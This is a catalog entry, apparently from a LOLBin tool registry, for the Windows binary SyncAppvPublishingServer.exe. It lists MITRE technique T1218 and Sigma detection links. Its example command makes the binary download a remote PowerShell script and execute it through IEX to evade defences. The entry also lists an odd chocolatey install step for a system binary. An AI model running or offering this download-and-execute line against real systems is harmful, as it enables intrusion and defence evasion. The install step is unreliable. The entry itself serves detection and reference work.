---
id: windows-execution-syncappvpublishingserver
namespace: windows:execution:syncappvpublishingserver
name: syncappvpublishingserver
description: 'Used by App-v to get App-v server lists Located at: C:\Windows\System32\SyncAppvPublishingServer.exe; C:\Windows\SysWOW64\SyncAppvPublishingServer.exe.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- security.execution.command
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: low
  disk_io: low
allowed-tools:
- syncappvpublishingserver
parameters: []
features: []
execution:
  template: syncappvpublishingserver
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Example command on how inject Powershell code into the process (Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures)
  command: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
references:
- label: '895045566090010624'
  url: https://twitter.com/monoxgas/status/895045566090010624
techniques:
- execution
- defense-evasion
mitre_ids:
- T1218
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/powershell/powershell_script/posh_ps_syncappvpublishingserver_exe.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/powershell/powershell_module/posh_pm_syncappvpublishingserver_exe.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_execute_psh.yml
- type: ioc
  description: SyncAppvPublishingServer.exe should never be in use unless App-V is deployed
install:
- method: choco
  package_name: syncappvpublishingserver
  commands:
  - choco install syncappvpublishingserver
---


# syncappvpublishingserver

syncappvpublishingserver is a Windows LOLBin. Used by App-v to get App-v server lists Located at: C:\Windows\System32\SyncAppvPublishingServer.exe; C:\Windows\SysWOW64\SyncAppvPublishingServer.exe.
